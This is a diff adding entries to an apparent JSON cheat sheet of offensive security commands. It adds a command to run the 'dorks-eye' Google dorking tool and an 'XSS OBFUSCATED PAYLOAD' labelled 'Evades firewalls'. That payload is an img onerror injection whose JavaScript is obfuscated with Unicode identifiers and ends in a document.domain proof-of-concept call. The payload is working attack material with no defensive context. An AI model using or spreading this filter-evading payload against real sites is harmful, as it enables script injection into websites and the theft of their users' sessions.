@@ -302,5 +302,19 @@
             "    \"n\": \"6o4aWTLVvjTCnscT0U9YjSC1mlcFEue0vz3l1xfF-gdUZpjyz03ZAsRWKzoVYCKAgDYr2oRNhZx_bqnjOKHbUNoezaODni5vu3L1q6_Ea8M43N-76ECFUx8yn3VwdiQWtJKcDVinObKhr1O31dC7-Fvd8jIkknNfhnBJhSxuopyMN1Kvf4W2UZp4rc83hjSmraZ0TTSlbSsK9ZV4R69ahlkC7fUErTAycI50B9n_2B3zEU8RUUEmUi8zBfjQ8d50ej-re6z13IZ14wqBm0T14nY9JkHEMoKiw78z0LOv1V9qWgwOIKu-XMCcrCn6RiN86TJP-WwmXWdxJDy_g_pXGQ\"",
             "}"
         ]
+    },
+    {
+        "title": "GORKING:USING DORKS-EYE",
+        "subtitle": "Fetches results from google",
+        "commands": [
+            "python ~/dorks-eye/dorks-eye.py"
+        ]
+    },
+    {
+        "title": "XSS OBFUSCATED PAYLOAD",
+        "subtitle": "Evades firewalls",
+        "commands": [
+            "&lt;img/src=x onerror=\"𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()\""
+        ]
     }
 ]
